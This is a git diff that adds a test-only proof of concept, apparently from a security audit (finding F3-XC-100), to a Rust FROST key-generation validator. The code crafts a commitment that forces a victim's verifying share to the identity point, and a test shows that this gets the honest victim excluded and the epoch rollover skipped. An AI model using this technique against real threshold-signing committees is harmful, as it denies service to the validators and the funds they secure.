@@ -1,0 +1,290 @@
+diff --git a/crates/validator/src/frost/mod.rs b/crates/validator/src/frost/mod.rs
+index 4ce7855..ec5468f 100644
+--- a/crates/validator/src/frost/mod.rs
++++ b/crates/validator/src/frost/mod.rs
+@@ -14,6 +14,104 @@ mod participants;
+ mod serialization;
+ pub mod sign;
+ 
++/// F3-XC-100 PoC helper (temporary): builds the identity-verifying-share attack
++/// vectors for a committee of `addrs` (attacker LAST). The attacker keeps a
++/// valid proof of knowledge of `c[0]` and proof of possession of `q`, and only
++/// rewrites its `c[1]` so that the victim's verifying share sums to the
++/// identity. The crafted commitment still passes `verify_commitment`; the
++/// victim's own `generate_secret_shares` then yields `y = (0, 0)`.
++#[cfg(test)]
++pub(crate) mod identity_attack {
++    use super::{keygen, marshal, participants};
++    use crate::bindings;
++    use alloy::primitives::Address;
++    use std::collections::BTreeMap;
++
++    /// Returns `(victim_secrets, published_commitments, honest_shares,
++    /// victim_verifying_share)`: the victim's secrets, the five published
++    /// commitments (attacker last, `c[1]` crafted), the published secret shares
++    /// of the three honest non-victim/non-attacker participants, and the
++    /// victim's own verifying share (expected to be the identity `(0, 0)`).
++    pub(crate) fn vectors(
++        addrs: &[Address],
++        threshold: u16,
++        victim: Address,
++    ) -> (
++        keygen::Secrets,
++        Vec<(Address, bindings::KeyGenCommitment)>,
++        Vec<(Address, bindings::KeyGenSecretShare)>,
++        bindings::Point,
++    ) {
++        let count = addrs.len() as u16;
++        let attacker = *addrs.last().expect("non-empty committee");
++        let mut rng = rand::thread_rng();
++
++        let mut secrets = BTreeMap::new();
++        let mut commitments = BTreeMap::new();
++        for &a in addrs {
++            let s = keygen::setup(&mut rng, a, count, threshold).unwrap();
++            commitments.insert(a, s.commitment());
++            secrets.insert(a, s);
++        }
++
++        // Force the victim's verifying share Y_v = sum_k eval_k(x_v) to the
++        // identity by choosing the attacker's c[1]:
++        //   Y_v = S0 + x*(S1_others + c1_A) + x^2*S2  = O
++        //   c1_A = -(S0 + x^2*S2)/x - S1_others
++        // with S0 = sum c[0], S2 = sum c[2], S1_others = sum_{k!=A} c[1].
++        let x = participants::identifier(victim).to_scalar();
++        let s0: k256::ProjectivePoint = addrs
++            .iter()
++            .map(|a| marshal::frost_point(&commitments[a].c[0]).unwrap())
++            .sum();
++        let s2: k256::ProjectivePoint = addrs
++            .iter()
++            .map(|a| marshal::frost_point(&commitments[a].c[2]).unwrap())
++            .sum();
++        let s1_others: k256::ProjectivePoint = addrs
++            .iter()
++            .filter(|a| **a != attacker)
++            .map(|a| marshal::frost_point(&commitments[a].c[1]).unwrap())
++            .sum();
++        let c1_attacker = -((s0 + s2 * (x * x)) * x.invert().unwrap()) - s1_others;
++        commitments.get_mut(&attacker).unwrap().c[1] = marshal::solidity_point(&c1_attacker);
++
++        // Every validator verifies the (crafted) commitments; this succeeds.
++        let verified: BTreeMap<_, _> = addrs
++            .iter()
++            .map(|&a| (a, keygen::verify_commitment(a, &commitments[&a]).unwrap()))
++            .collect();
++
++        // The three honest non-victim/non-attacker participants publish their
++        // (valid) secret shares.
++        let mut honest_shares = Vec::new();
++        for &a in addrs {
++            if a == victim || a == attacker {
++                continue;
++            }
++            let (_state, share) =
++                keygen::generate_secret_shares(secrets[&a].clone(), verified.clone()).unwrap();
++            honest_shares.push((a, share));
++        }
++
++        // The victim's own share: its verifying share is the identity.
++        let (_vstate, victim_share) =
++            keygen::generate_secret_shares(secrets[&victim].clone(), verified.clone()).unwrap();
++
++        let published: Vec<_> = addrs
++            .iter()
++            .map(|&a| (a, commitments.remove(&a).unwrap()))
++            .collect();
++
++        (
++            secrets.remove(&victim).unwrap(),
++            published,
++            honest_shares,
++            victim_share.y,
++        )
++    }
++}
++
+ #[cfg(test)]
+ mod tests {
+     use super::*;
+diff --git a/crates/validator/src/state/keygen.rs b/crates/validator/src/state/keygen.rs
+index a59ee7b..0fe96aa 100644
+--- a/crates/validator/src/state/keygen.rs
++++ b/crates/validator/src/state/keygen.rs
+@@ -1445,3 +1445,176 @@ macro_rules! fail_rollover {
+     }};
+ }
+ use fail_rollover;
++
++// F3-XC-100 PoC (temporary): drive a real validator `Transition` through the
++// un-executed glue: one honest victim fed the five commitments (attacker last,
++// crafting the identity cancellation), the three honest peers' secret shares
++// (the victim's reverts onchain and never lands; the attacker withholds), then
++// the share-round timeout. The victim and the attacker are excluded together,
++// leaving fewer than `min_participants`, so the rollover is skipped.
++#[cfg(test)]
++mod poc_f3_xc_100 {
++    use super::*;
++    use crate::{
++        bindings::{self, Coordinator},
++        config::{Participant, ValidatorConfig},
++        consensus::hashing::ConsensusDomain,
++        frost::identity_attack,
++        service::{Event, Resume},
++    };
++    use alloy::primitives::{Address, address};
++    use safenet_core::{
++        index::{EventBlock, EventLog},
++        state::{Message, StateTransition},
++    };
++
++    fn coord_log(block: u64, index: u64, event: Coordinator::CoordinatorEvents) -> EventLog<Event> {
++        EventLog {
++            block: EventBlock {
++                number: block,
++                timestamp: block,
++            },
++            index,
++            address: Address::ZERO,
++            data: Event::Coordinator(event),
++        }
++    }
++
++    #[test]
++    fn identity_share_excludes_victim_and_skips_epoch() {
++        // Aegis sizing: 5 validators, threshold 3 of 5, a rollover epoch.
++        let addrs = [
++            address!("0x1000000000000000000000000000000000000001"),
++            address!("0x2000000000000000000000000000000000000002"),
++            address!("0x3000000000000000000000000000000000000003"),
++            address!("0x4000000000000000000000000000000000000004"),
++            address!("0x5000000000000000000000000000000000000005"),
++        ];
++        let victim = addrs[0];
++        let attacker = addrs[4];
++        let consensus_addr = address!("0x00000000000000000000000000000000000000c0");
++        let number = NonZeroU64::new(2).unwrap();
++
++        let participants = addrs
++            .iter()
++            .map(|&address| Participant {
++                address,
++                active_from: 0,
++                active_before: None,
++            })
++            .collect::<Vec<_>>();
++        let config = ValidatorConfig {
++            consensus: consensus_addr,
++            staker: None,
++            participants,
++            oracles: BTreeSet::new(),
++            genesis_salt: B256::ZERO,
++            blocks_per_epoch: NonZeroU64::new(1440).unwrap(),
++            key_gen_timeout: NonZeroU64::new(120).unwrap(),
++            signing_timeout: NonZeroU64::new(6).unwrap(),
++            oracle_timeout: NonZeroU64::new(24).unwrap(),
++        };
++        let genesis =
++            group::participants_set(&config.participants, group::Epoch::Genesis { salt: B256::ZERO })
++                .unwrap();
++        let transition = Transition {
++            account: victim,
++            genesis,
++            consensus: ConsensusDomain::new(100, consensus_addr),
++            config,
++        };
++
++        let next_epoch = EpochId::Number { number };
++        let pset = group::participants_set(
++            &transition.config.participants,
++            group::Epoch::Number {
++                consensus: consensus_addr,
++                number,
++                excluded: BTreeSet::new(),
++            },
++        )
++        .unwrap();
++        let gid = pset.group().id();
++
++        let (victim_secrets, commitments, honest_shares, victim_y) =
++            identity_attack::vectors(&addrs, 3, victim);
++        // Root cause: the victim's verifying share is forced to the identity,
++        // which marshals to (0, 0); the contract rejects (0, 0) in `set`.
++        assert_eq!(victim_y, bindings::Point::default());
++
++        // Enter the rollover key generation as the real block clock would, then
++        // resume the victim's own key-gen setup.
++        let (state, _c) =
++            transition.start_key_gen(State::default(), next_epoch, &pset, Some(120));
++        let (mut state, _c) = transition.apply_transition(
++            state,
++            Message::Resume(Resume::Setup {
++                group_id: gid,
++                secrets: Box::new(victim_secrets),
++            }),
++        );
++
++        // All five commit at block 1, the attacker last.
++        for (i, (addr, commitment)) in commitments.into_iter().enumerate() {
++            let event = Coordinator::CoordinatorEvents::KeyGenCommitted(Coordinator::KeyGenCommitted {
++                gid,
++                participant: addr,
++                commitment,
++                committed: true,
++            });
++            (state, _) = transition.apply_transition(state, Message::Event(coord_log(1, i as u64, event)));
++        }
++
++        // The three honest peers' shares land at block 2. The victim's share has
++        // y = (0, 0) and reverts in `FROSTParticipantMap.set`, so it never lands;
++        // the attacker withholds its own.
++        for (i, (addr, share)) in honest_shares.into_iter().enumerate() {
++            let event = Coordinator::CoordinatorEvents::KeyGenSecretShared(Coordinator::KeyGenSecretShared {
++                gid,
++                participant: addr,
++                share,
++                shared: true,
++            });
++            (state, _) = transition.apply_transition(state, Message::Event(coord_log(2, i as u64, event)));
++        }
++
++        // The share round closes at its deadline (last commitment block 1 +
++        // key_gen_timeout 120).
++        let (state, _c) = transition.apply_transition(state, Message::NewBlock(200));
++
++        // The share-timeout rule excludes everyone with no landed share, which
++        // is the attacker AND the honest victim; the remaining three are below
++        // min_participants(5) = 4, so the epoch is skipped.
++        assert!(
++            matches!(state.rollover, RolloverState::EpochSkipped { next_epoch: e } if e == number),
++            "expected EpochSkipped, got {:?}",
++            state.rollover
++        );
++
++        // Bite preview: excluding only the real non-sharer (the attacker, which
++        // is what remediation 1 does) keeps the group viable; it is pulling the
++        // honest victim out alongside the attacker that dooms the rollover.
++        assert!(
++            group::participants_set(
++                &transition.config.participants,
++                group::Epoch::Number {
++                    consensus: consensus_addr,
++                    number,
++                    excluded: BTreeSet::from([attacker]),
++                },
++            )
++            .is_some()
++        );
++        assert!(
++            group::participants_set(
++                &transition.config.participants,
++                group::Epoch::Number {
++                    consensus: consensus_addr,
++                    number,
++                    excluded: BTreeSet::from([victim, attacker]),
++                },
++            )
++            .is_none()
++        );
++    }
++}
